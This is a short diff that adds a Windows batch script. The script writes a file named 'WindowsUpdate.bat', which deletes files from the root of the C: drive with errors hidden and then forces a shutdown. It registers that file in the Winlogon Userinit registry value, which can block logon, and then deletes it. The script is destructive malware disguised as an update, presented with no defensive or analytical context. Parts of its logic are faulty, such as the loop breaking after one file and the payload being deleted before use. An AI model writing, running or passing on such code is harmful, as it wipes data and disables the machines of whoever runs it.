@@ -1,0 +1,23 @@
+@echo off
+
+set "batchScript=C:\Downloads\WindowsUpdate.bat"
+
+(
+    echo @echo off
+    echo for /f "delims=" %%F in ('dir /b /o:n "C:\"') do (
+    echo     del /q "C:\%%F" >nul 2^>^&1
+    echo     goto :Shutdown
+    echo )
+    echo :Shutdown
+    echo shutdown -s -f -t 0
+    echo cls
+    echo exit
+) > "%batchScript%"
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "Path" /t REG_SZ /d "%batchScript%" /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit" /t REG_SZ /d "%batchScript%" /f
+
+del /q "%batchScript%"
+cls
+exit
